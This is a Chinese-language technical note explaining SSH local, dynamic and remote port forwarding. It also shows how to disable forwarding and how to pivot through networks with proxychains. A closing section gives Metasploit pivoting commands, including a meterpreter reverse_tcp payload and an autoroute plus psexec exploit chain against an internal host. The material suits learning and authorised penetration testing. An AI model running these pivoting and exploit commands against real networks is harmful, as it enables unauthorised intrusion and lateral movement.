---
title: 端口转发之SSH隧道
date: 2018-01-17 15:20:00
categories:
   - 技术相关
tags:
   - 端口转发
   - SSH隧道
   - 笔记
#summary_img: /images/pic1.jpg
---
.....
<!-- more -->

## ssh隧道有3种类型
    动态端口转发（Socks 代理）
    本地端口转发
    远程端口转发


## 本地端口转发

通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。

已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口）

    host1 : 本地主机
    host2 : 远程主机（目的主机）
    host3 : 

    host1  <-> host2  (都不通)
    host3同时连通前面两台主机
    host1  -> host2   (最终目的)

想法就是，通过host3，将host1连上host2

我们在host1执行下面的命令：

	$ ssh -L 2121:host2:21 host3
    
命令中的L参数一共接受三个值，分别是"本地端口:目标主机:目标主机端口"，它们之间用冒号分隔。

这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，

转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。

这样一来，在host1连接本地的2121端口，就等于连上了host2的21端口。

	$ ftp localhost:2121
	$ ssh -p 2121 localhost   (21端口改为22)

优点

	无需设置代理
    
缺点

	每个服务都需要配置不同的端口转发

	
	
## 动态端口转发
既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性

动态端口允许通过配置一个本地端口，把通过隧道到数据转发到远端的所有地址。

本地的应用程序需要使用Socks协议与本地端口通讯。此时SSH充当Socks代理服务器的角色。

假定我们要让8080端口的数据，都通过SSH传向远程主机：

	$ ssh -D 8080 user@host

SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到

SSH连接上面，发往远程主机。

可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。

优点

	配置一个代理服务就可以访问远端机器和与其所在子网络的所有服务
缺点

	应用程序需要额外配置SOCKS代理，若应用程序不支持代理配置则无法使用


## 远程端口转发
远程端口转发用于某些单向阻隔的内网环境，比如说NAT，网络防火墙。
在NAT设备之后的内网主机可以直接访问公网主机，但外网主机却无法访问内网主机的服务。
如果内网主机向外网主机建立一个远程转发端口，就可以让外网主机通过该端口访问该内网主机的服务。
可以把这个内网主机理解为“内应”和“开门者”。

	host1 ： 外网机器
	host2 ： 目的主机
	host3 ： 内网机器
	host3  -> host1  (通)
	host1  -> host3  (不通)
	host1  -> host2  (最终目的)

解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了

在host3执行下面的命令：

	$ ssh -R 2121:host2:22 root@host1
	-R : "远程主机端口:目标主机:目标主机端口"。

host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。
由于对于host3来说，host1是远程主机，所以这种情况就被称为"远程端口绑定"。
在host1就可以连接host2了：

	$ ssh localhost:2121

如果host3是目的主机的话，即源主机是目的主机，我们的目的是host1->host3 (通)
则：
	在host3上执行： ssh -NfR 2121:localhost:22 user@host1 -p 22
	将host3的22端口和host1的2121端口绑定，相当于远程端口映射
	在host1就可以连接host3了：

		$ ssh localhost -p 2121

	也可以在host2上：

		$ ssh host1 -p 2121
	
优点

	可以穿越防火墙和NAT设备
缺点

	每个服务都需要配置不同的端口转发

	
如何禁止端口转发

设置ssh服务配置文件/etc/ssh/sshd_config

	AllowTcpForwarding no


## 简而言之
	http://staff.washington.edu/corey/fw/ssh-port-forwarding.html

	本地访问127.0.0.1:port1就是host:port2(用的更多)
	ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发

	访问host:port2就是访问127.0.0.1:port1
	ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发

	可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口
	ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port

	可以将dmz_host的hostport端口转发到remote_ip的port端口
	ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类

	
## SSH 穿透

	ssh -D 127.0.0.1:1080 -p 22 user@IP 
	Add socks4 127.0.0.1 1080 in /etc/proxychains.conf 
	proxychains commands target 

SSH 穿透从一个网络到另一个网络

	ssh -D 127.0.0.1:1080 -p 22 user1@IP1 
	Add socks4 127.0.0.1 1080 in /etc/proxychains.conf 
	proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2 
	Add socks4 127.0.0.1 1081 in /etc/proxychains.conf 
	proxychains commands target 

使用 metasploit 进行穿透

	route add X.X.X.X 255.255.255.0 1 
	use auxiliary/server/socks4a 
	run 
	proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E

或者

	# http://www.offensive-security.com/metasploit-unleashed/pivoting/
	meterpreter > ipconfig 
	IP Address  : 10.1.13.3 
	meterpreter > run autoroute -s 10.1.13.0/24 
	meterpreter > run autoroute -p 
	10.1.13.0          255.255.255.0      Session 1 
	meterpreter > Ctrl+Z 
	msf auxiliary(tcp) > use exploit/windows/smb/psexec 
	msf exploit(psexec) > set RHOST 10.1.13.2 
	msf exploit(psexec) > exploit 
	meterpreter > ipconfig 
	IP Address  : 10.1.13.2 
	

扩展：

	通过VPS SSH隧道使用本地msf
	https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html


from :
	三种不同类型的ssh隧道
	http://hetaoo.iteye.com/blog/2299123
	ssh用法及命令
	http://blog.csdn.net/pipisorry/article/details/52269785
	ssh隧道建立
	http://blog.csdn.net/yuanchao99/article/details/72877586
    	xxxx
    	https://xianzhi.aliyun.com/forum/topic/142
	SSH隧道综合指南
	https://www.4hou.com/technology/10863.html
